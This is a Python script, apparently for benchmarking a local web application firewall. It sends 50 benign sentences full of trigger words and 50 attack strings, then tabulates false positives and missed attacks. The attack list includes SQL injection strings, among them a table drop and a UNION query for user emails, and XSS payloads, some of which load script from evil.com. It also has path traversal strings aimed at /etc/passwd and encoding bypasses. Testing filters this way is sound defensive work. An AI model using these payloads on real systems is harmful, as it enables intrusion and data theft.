import requests
from tabulate import tabulate

# 🔗 検証対象の各エンドポイント
URL_WITHOUT_WAF = "http://localhost:8080/search"  # バックエンド（MariaDB接続）直叩き
URL_WITH_WAF    = "http://localhost:9000/search"  # WAFプロキシ経由

# 🟢 【50件】攻撃キーワードをギリギリ含みつつも、絶対にブロックしてはいけない「正常なリクエスト」
safe_payloads = [
    # 📑 「select」の限界ブレイク（名詞・動詞・組み合わせ）
    "Please select all items from the menu.",
    "We need to select a new team leader tomorrow.",
    "Click here to select your country of residence.",
    "The select committee will review the policy next week.",
    "You can select multiple options using the checkbox.",
    "They offer a select range of premium organic teas.",
    "Did you select the correct database profile?",
    "Natural selection is a core concept in evolutionary biology.",
    "I cannot select which path to take for my career.",
    "Please select 'None' if you do not have an account.",

    # 🤝 「union」の限界ブレイク（労働組合、連合、結合）
    "The labor union organized a peaceful protest today.",
    "European Union representatives met in Brussels.",
    "We need a perfect union of design and functionality.",
    "A credit union offers lower interest rates for members.",
    "The student union is planning a welcome party.",
    "They are working to form a trade union at the factory.",
    "This rugby union match is being broadcast worldwide.",
    "Soviet Union history is a complex topic to study.",
    "The state of the union address will happen tonight.",
    "Data union models allow users to monetize their insights.",

    # 🎬 「script」の限界ブレイク（台本、プログラミング、文字）
    "The actor spent all night memorizing his script.",
    "I am writing a bash script to automate server reboots.",
    "This ancient manuscript was discovered in Egypt.",
    "The postscript (P.S.) at the end of the letter was sweet.",
    "We need to update the python script for data ingestion.",
    "The movie script underwent several major rewrites.",
    "Can you check if this shell script has execute permissions?",
    "The description was written in a beautiful cursive script.",
    "I found a useful subscription script on GitHub.",
    "The prescription script must be signed by a doctor.",

    # 🚪 「../」「..\」およびパス関連の限界ブレイク
    "The reference index is located in the ../ folder.",
    "To go up one level, type 'cd ..' in your terminal.",
    "The price went from $10..$20 within a single week.",
    "I left a comment containing a couple of dots... like this.",
    "The backup file is saved as standard_backup..dat",
    "Please read page 5 and then look at page 10..15 for context.",
    "The directory structure uses a backslash like C:\\Users.",
    "The file named 'dot.dot.txt' was uploaded successfully.",
    "We need to bridge the gap between back-end and front-end.",
    "The score was tied at 2-2 after the double overtime.",

    # 🎭 「or 1=1」「onerror」などの類似・空目ワードの限界ブレイク
    "Is it better to choose this option, or that one?",
    "The color of the sky is blue, or sometimes gray.",
    "Our team won the championship match 1 to 1.",
    "The odds of winning this lottery are exactly 1 in 100.",
    "This specific test case is classified as a category 1 error.",
    "The coordinator or manager will contact you shortly.",
    "We must focus on error handling to prevent application crashes.",
    "The generator needs an immediate hardware inspection.",
    "The marathon runner showed incredible stamina and honor.",
    "The major factor for success is our continuous collaboration."
]

# 🔴 【50件】WAFが確実にブロックしなければならない、多種多様な「ガチの攻撃リクエスト」
attack_payloads = [
    # 💥 SQLインジェクション (SQLi) 関連
    "' or '1'='1",
    "' or 1=1--",
    "' or 'a'='a",
    "') or ('1'='1",
    "1' or 1=1#",
    "1 or 1=1",
    "' or 1=1 limit 1",
    "' union select null--",
    "' UNION SELECT 1,2,3--",
    "' union select id,name,email from users--",
    "' UNION/**/SELECT /**/id,name,email FROM users--",
    "UNION\nSELECT\nid,name,email\nFROM\nusers",
    "UNION%0aSELECT+id,name,email+FROM+users",
    "'; DROP TABLE users;--",
    "' OR true--",
    "' OR 1=1 ORDER BY 1--",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1 struct--",
    "' xor 1=1--",

    # ⚠️ クロスサイトスクリプティング (XSS) 関連
    "<script>alert(1)</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script src=http://evil.com/hook.js>",
    "<img src=x onerror=alert(1)>",
    "<img src=\"javascript:alert(1)\">",
    "<body onload=alert(1)>",
    "<svg onmouseover=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<math><x href=\"javascript:alert(1)\">",
    "<script\x00>alert(1)</script>",
    "<script/src='http://evil.com'></script>",
    "&#60;script&#62;",

    # 📁 パストラバーサル 関連
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd\x00",
    "....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",

    # 🥷 難読化・多重エンコードによるバイパス模索
    "%253cscript%253ealert(1)%253c/script%253e",
    "&#x3c;script&#x3e;alert(1)",
    r'{"query": "\u003cscript\u003e"}',
    "%26%23x3c%3bscript%26%23x3e%3b",
    r"'\u0020or\u00201=1--",
    r"UNION\u0020SELECT"
]

# 安全のため、双方必ず50件ずつであることを担保
safe_payloads = safe_payloads[:50]
attack_payloads = attack_payloads[:50]

def run_mass_test():
    total_safe = len(safe_payloads)
    total_attack = len(attack_payloads)

    false_positives = 0  # 誤検知（安全なのに403ブロックされた数）
    true_positives = 0   # 正検知（攻撃を正しく403ブロックした数）
    false_negatives = 0  # すり抜け（攻撃なのに200等で通過した数）

    fp_details = []
    fn_details = []

    print(f"🚀 100本ノック開始: 合計 {total_safe + total_attack} 件のペイロードを送信中...")

    # 1. 正常リクエスト（誤検知テスト）のループ
    for p in safe_payloads:
        try:
            res = requests.post(URL_WITH_WAF, data={"q": p}, timeout=2)
            if res.status_code == 403:
                false_positives += 1
                fp_details.append(p)
        except Exception as e:
            print(f"❌ WAF通信エラー (Safe Data): {e}")

    # 2. 攻撃リクエスト（検知率テスト）のループ
    for p in attack_payloads:
        try:
            res = requests.post(URL_WITH_WAF, data={"q": p}, timeout=2)
            if res.status_code == 403:
                true_positives += 1
            else:
                false_negatives += 1
                fn_details.append(p)
        except Exception as e:
            print(f"❌ WAF通信エラー (Attack Data): {e}")

    # 📊 各種メトリクスの計算
    accuracy_safe = ((total_safe - false_positives) / total_safe) * 100
    accuracy_attack = (true_positives / total_attack) * 100

    summary_data = [
        ["正常データ (False Positive 検証)", total_safe, total_safe - false_positives, false_positives, f"{accuracy_safe:.1f}%"],
        ["攻撃データ (True Positive 検証)", total_attack, true_positives, false_negatives, f"{accuracy_attack:.1f}%"]
    ]

    print("\n" + "="*85)
    print("📊 WAF 100本ノック（誤検知・正検知）統計マトリクス")
    print("="*85)
    print(tabulate(summary_data, headers=["データ検証種別", "総件数", "成功 (意図通り)", "失敗", "成功率"], tablefmt="fancy_grid"))

    # ❌ 誤検知（巻き添えブロック）のレポート
    if false_positives > 0:
        print("\n❌ 【誤検知 (False Positive)】ブロックされてしまった安全なリクエスト:")
        for fp in fp_details:
            print(f"  - \"{fp}\"")

    # 💀 すり抜け（検知漏れ）のレポート
    if false_negatives > 0:
        print("\n💀 【すり抜け (False Negative)】WAFを貫通した攻撃ペイロード:")
        for fn in fn_details:
            print(f"  - \"{fn}\"")

    print("="*85)

if __name__ == "__main__":
    run_mass_test()